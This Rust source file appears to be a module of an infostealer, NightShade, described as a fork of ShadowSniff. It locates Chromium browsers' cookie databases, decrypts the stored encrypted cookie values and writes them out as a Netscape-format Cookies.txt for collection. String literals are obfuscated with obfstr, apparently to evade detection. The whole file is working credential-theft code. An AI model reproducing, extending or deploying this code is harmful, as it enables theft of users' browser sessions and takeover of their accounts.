/*
 * This file is part of NightShade (a hardened fork of sqlerrorthing/ShadowSniff)
 *
 * MIT License
 *
 * Copyright (c) 2025 sqlerrorthing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

use crate::chromium::{BrowserData, decrypt_data};
use crate::{
    Cookie, ExtractExt, SqliteDatabase, collect_unique_from_profiles, to_string_and_write_all,
};
use alloc::sync::Arc;
use alloc::vec::Vec;
use collector::{Browser, Collector};
use database::DatabaseExt;
use database::DatabaseReader;
use derive_new::new;
use filesystem::FileSystem;
use filesystem::path::Path;
use obfstr::obfstr as s;
use tasks::{Task, parent_name};

// Fallback indices for the current Cookies schema (with top_frame_site_key).
// Older Chromium forks without that column shift everything, so the indices
// are resolved from the live schema at runtime whenever possible.
const COOKIES_HOST_KEY: usize = 1;
const COOKIES_NAME: usize = 3;
const COOKIES_ENCRYPTED_VALUE: usize = 5;
const COOKIES_PATH: usize = 6;
const COOKIES_EXPIRES_UTC: usize = 7;

#[derive(new)]
pub struct CookiesTask {
    browser: Arc<BrowserData>,
}

impl<C: Collector, F: FileSystem> Task<C, F> for CookiesTask {
    parent_name!("Cookies.txt");

    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
        let browser = self.browser.clone();

        let Some(cookies) = collect_unique_from_profiles(&self.browser.profiles, |profile| {
            read_profile_cookies(filesystem, profile, &browser)
        }) else {
            return;
        };

        collector.get_browser().increase_cookies_by(cookies.len());
        let _ = to_string_and_write_all(&cookies, "\n", filesystem, parent);
    }
}

fn read_profile_cookies<F>(
    filesystem: &F,
    profile: &Path,
    browser: &BrowserData,
) -> Option<Vec<Cookie>>
where
    F: FileSystem,
{
    // Modern layout lives under profile\Network\Cookies (Chromium >= 96);
    // older forks keep the DB directly in the profile folder.
    let modern_path = profile / s!("Network") / s!("Cookies");
    let db_path = if filesystem.is_exists(&modern_path) {
        modern_path
    } else {
        profile / s!("Cookies")
    };

    if !filesystem.is_exists(&db_path) {
        return None;
    }

    let db: SqliteDatabase = DatabaseExt::from_path(filesystem, &db_path).ok()?;

    // Resolve column indices from the live schema; fall back to the current
    // Chromium layout if pragma lookup fails.
    let column = |name: &str| {
        db.table_columns(s!("Cookies"))
            .and_then(|columns| columns.iter().position(|column| column == name))
    };

    let host_key = column(s!("host_key")).unwrap_or(COOKIES_HOST_KEY);
    let name = column(s!("name")).unwrap_or(COOKIES_NAME);
    let path = column(s!("path")).unwrap_or(COOKIES_PATH);
    let expires_utc = column(s!("expires_utc")).unwrap_or(COOKIES_EXPIRES_UTC);
    let encrypted_value = column(s!("encrypted_value")).unwrap_or(COOKIES_ENCRYPTED_VALUE);

    let table = db.read_table(s!("Cookies"))?;

    let extract = Cookie::make_extractor((
        host_key,
        name,
        path,
        expires_utc,
        encrypted_value,
        |value| decrypt_data(&value.as_blob()?, browser).map(Arc::from),
    ));

    let cookies: Vec<Cookie> = table
        .filter_map(|record| extract(&record))
        .map(|mut cookie| {
            // Chromium stores the WebKit epoch (microseconds since 1601-01-01);
            // the Netscape cookies.txt export expects UNIX seconds. Gecko
            // cookies are already UNIX, so normalize at the source here.
            cookie.expires_utc = (cookie.expires_utc / 1_000_000).saturating_sub(11_644_473_600);
            cookie
        })
        .collect();

    if cookies.is_empty() {
        None
    } else {
        Some(cookies)
    }
}
